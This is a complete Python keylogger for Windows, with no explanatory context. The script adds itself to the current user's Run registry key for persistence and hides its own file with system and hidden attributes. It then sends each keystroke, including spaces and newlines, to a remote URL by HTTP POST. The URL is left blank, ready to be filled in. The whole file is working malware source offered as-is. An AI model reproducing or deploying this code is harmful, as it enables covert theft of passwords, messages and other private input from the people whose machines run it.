import keyboard
import requests
import winreg
import subprocess
import sys
import os

path = os.path.realpath(sys.argv[0])
url = ""

def startup():
	script_name = os.path.basename(path)
	key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
	command = f'"{sys.executable.replace("python", "pythonw")}" "{path}"'

	with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as key:
		winreg.SetValueEx(key, script_name, 0, winreg.REG_SZ, command)

def hide():
	subprocess.run(["attrib", "+s", "+h", path])

def on_press(key):
	key = key.name
	
	if len(key) > 1:
		if key == "space":
			key = " "
		elif key == "enter":
			key = "\n"
		else:
			return
	
	requests.post(url, key)

startup()
hide()

while True:
	try:
		response = requests.get(url)
		break
	except requests.exceptions.ConnectionError:
		pass

keyboard.on_press(on_press)
keyboard.wait()